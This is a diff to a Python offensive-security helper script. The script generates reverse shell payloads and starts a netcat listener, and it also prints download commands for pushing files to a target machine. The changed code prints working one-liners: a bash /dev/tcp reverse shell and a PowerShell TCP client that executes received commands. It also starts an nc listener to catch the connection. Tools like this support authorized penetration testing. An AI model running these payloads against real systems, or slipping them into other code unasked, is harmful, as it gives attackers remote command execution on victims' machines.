@@ -8,7 +8,7 @@ import random
 import hashlib
 import string
 import netifaces as ni
-from time import sleep
+import time
 from getpass import getpass
 
 TransferTo_Methods = ['HTTP', 'SCP', 'Base64']
@@ -33,6 +33,32 @@ def dynamic_populated_choices(entrymsg, dynamic_list):
         else:
             print('[!] Invalid choice. Try again.')
 
+# SELECT IP ADDRESS TO LISTEN TO
+def listening_ip_address():
+    # SELECT IP ADDRESS TO LISTEN TO
+    ip_list = []
+    for interface in ni.interfaces():
+        ipv4 = ni.ifaddresses(interface)
+        if ni.AF_INET in ipv4.keys():
+            ip_list.append(ipv4[ni.AF_INET][0]['addr'])
+    while True:
+        print('[?] What IP address to listen on? ')
+        i = 1
+        for ip in ip_list:
+            print('      ' + str(i) + ') ' + ip)
+            i += 1
+        print('[?] CHOICE: ', end='')
+        try:
+            choice = input()
+            if choice == '':
+                choice = '999'
+        except KeyboardInterrupt:
+            sys.exit(0)
+        if int(choice) <= len(ip_list):
+            return ip_list[int(choice)-1]
+        else:
+            print('Invalid choice. Try again.')
+
 # RUN COMMONLY USED COMMANDS
 def run_command(args):
     # RUN NMAP SCAN
@@ -50,40 +76,56 @@ def run_command(args):
 
 # CREATE A PAYLOAD
 def create_payload(args):
+    if args.shell == 'bind':
+        print('[?] Target IP: ', end='')
+        listen_ip = input()
+    else:
+        listen_ip = listening_ip_address()
+    print('[?] Listening Port [default=random]: ', end='')
+    try:
+        listen_port = input()
+    except KeyboardInterrupt:
+        sys.exit(0)
+    if listen_port == '':
+        listen_port = 'random'
+    if listen_port == 'random':
+        random_port = random.randint(1024, 49151)
+        listen_port = str(random_port)
+    print('[+] Using port ' + listen_port)
+
     print('[+] Creating payload ...')
-
-    # GENERATE PSEUDO-RANDOM PORT
-    if args.listen_port == 'random':
-        random_port = random.randint(0, 49151)
-        args.listen_port = str(random_port)
-
     # CHECK PAYLOAD OS
-    if args.os == 'linux':
-        print('\n[===== LINUX PAYLOAD =====]\n')
-        print('bash -c \'bash -i >& /dev/tcp/' + args.listen_ip + '/' + args.listen_port + ' 0>&1\'')
-        print('\n[=== END LINUX PAYLOAD ===]\n')
-    elif args.os == 'windows':
-        print('\n[===== WINDOWS PAYLOAD =====]\n')
-        print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + args.listen_ip + '\',' + args.listen_port + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
-        print('\n[=== END WINDOWS PAYLOAD ===]\n')
+    if args.shell == 'reverse':
+        if args.os == 'linux':
+            print('\n[===== LINUX PAYLOAD =====]\n')
+            print('bash -c \'bash -i >& /dev/tcp/' + listen_ip + '/' + listen_port + ' 0>&1\'')
+            print('\n[=== END LINUX PAYLOAD ===]\n')
+        elif args.os == 'windows':
+            print('\n[===== WINDOWS PAYLOAD =====]\n')
+            print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + listen_ip + '\',' + listen_port + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
+            print('\n[=== END WINDOWS PAYLOAD ===]\n')
 
-    # PROMPT FOR LISTENER
-    print('[?] Would you like to run a listener? [y/N] ', end='')
-    run_listener = input().lower()
+        # PROMPT FOR LISTENER
+        print('[?] Would you like to run a listener? [Y/n] ', end='')
+        run_listener = input().lower()
 
-    # START LISTENER
-    if run_listener == '':
-        run_listener = 'n'
-    if run_listener[0] == 'y':
-        try:
-            # USE A RANDOM EPHEMERAL PORT
-            if args.listen_port == 'random':
-                subprocess.run(["nc", "-nvlp", random_port])
-            # USE A DEFINED PORT
-            else:
-                subprocess.run(["nc", "-nvlp", args.listen_port])
-        except KeyboardInterrupt:
-            sys.exit(0)
+        # START LISTENER
+        if run_listener == '' or run_listener[0] == 'y':
+            try:
+                print('[+] Listening on ' + listen_ip + ':' + listen_port + ' ...')
+                subprocess.run(['nc', '-nls', listen_ip,'-p', listen_port])
+            except KeyboardInterrupt:
+                sys.exit(0)
+        else:
+            print('[-] No listener was started')
+
+
+
+    elif args.shell == 'bind':
+        print('[!] Not yet implemented')
+    elif args.shell == 'web':
+        print('[!] Not yet implemented')
+
 
 # TRANSFER FILES TO
 def transfer_to(args):
@@ -100,28 +142,7 @@ def transfer_to(args):
 
     # PYTHON HTTP SERVER METHOD
     if method == 'http':
-        # SELECT IP ADDRESS TO LISTEN TO
-        ip_list = []
-        for interface in ni.interfaces():
-            ipv4 = ni.ifaddresses(interface)
-            if ni.AF_INET in ipv4.keys():
-                ip_list.append(ipv4[ni.AF_INET][0]['addr'])
-        while True:
-            print('[?] What IP address to listen on? ')
-            i = 1
-            for ip in ip_list:
-                print('      ' + str(i) + ') ' + ip)
-                i += 1
-            print('[?] CHOICE: ', end='')
-            try:
-                choice = input()
-            except KeyboardInterrupt:
-                sys.exit(0)
-            if int(choice) <= len(ip_list):
-                listen_ip = ip_list[int(choice)-1]
-                break
-            else:
-                print('Invalid choice. Try again.')
+        listen_ip = listening_ip_address()
 
         # START PYTHON HTTP SERVER
         print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
@@ -134,7 +155,6 @@ def transfer_to(args):
             sys.exit(1)
         
         # TARGET PASTABLES
-        print('[+] Run this command on target')
         if args.os == 'windows':
             print('[+] Select method:')
             print('      1. DownloadFile')
@@ -151,7 +171,7 @@ def transfer_to(args):
                 print('[+] DownloadFile method selected')
             if choice == '1':
                 print('[+] DownloadFile method selected')
-                print('[?] Sync or Async? ', end='')
+                print('[?] Sync or Async [default=sync]: ', end='')
                 sync = input().lower()
                 if sync == '':
                     sync = 'sync'
@@ -187,7 +207,8 @@ def transfer_to(args):
 
             # if args.firstlaunch:
             #     command = startcmd + ' -UseBasicParsing' + endcmd
-            
+
+            print('[+] Run this command on target')
             print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
             # if args.trust:
             #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')
@@ -302,8 +323,8 @@ def main():
     ################################
     ### PASSWORD CRACKING MODULE ###
     ################################
-    crackpass = modules.add_parser('crackpass', help='Crack password hashes')
-    crackpass.add_argument('filename', help='File that contains password hashes to crack')
+    # crackpass = modules.add_parser('crackpass', help='Crack password hashes')
+    # crackpass.add_argument('filename', help='File that contains password hashes to crack')
 
     #############################
     ### FILE TRANSFER MODULES ###
@@ -311,10 +332,10 @@ def main():
     transferto = modules.add_parser('transferto', help='Semi-automated file transfer to target')
     transferto.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
     transferto.add_argument('filename', help='File to transfer')
-    transferfrom = modules.add_parser('transferfrom', help='Pastables to transfer from target')
-    transferfrom.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
-    transferfrom.add_argument('method', help='Method of transferring', choices=['http', 'scp', 'base64'])
-    transferfrom.add_argument('filename', help='File to transfer')
+    # transferfrom = modules.add_parser('transferfrom', help='Pastables to transfer from target')
+    # transferfrom.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
+    # transferfrom.add_argument('method', help='Method of transferring', choices=['http', 'scp', 'base64'])
+    # transferfrom.add_argument('filename', help='File to transfer')
 
     #############################################
     ### RUN MODULE FOR COMMONLY USED COMMANDS ###
@@ -353,10 +374,8 @@ def main():
     ##########################################
     payloads = modules.add_parser('payloads', help='Reverse Shell, Bind Shell, and Web Shell')
     payloads.add_argument('shell', choices=['reverse','bind','web'], help='Type of shell')
-    payloads.add_argument('listen_ip', help='Listening IP address')
-    payloads.add_argument('listen_port', help='Listening port')
     payloads.add_argument('os', help='Target operating system', choices=['linux', 'windows'])
-    payloads.add_argument('--encode', choices=['base64','hex','nospace'])
+    # payloads.add_argument('--encode', choices=['base64','hex','nospace'])
 
     # PARSE ALL ARGS
     args = parser.parse_args() 
@@ -366,8 +385,10 @@ def main():
         create_payload(args)
     elif args.module == 'transferto':
         transfer_to(args)
-    elif args.module == 'crackpass':
-        password_crack(args)
+    # elif args.module == 'transferfrom':
+    #     transfer_from(args)
+    # elif args.module == 'crackpass':
+    #     password_crack(args)
     else:
         parser.print_help()
 
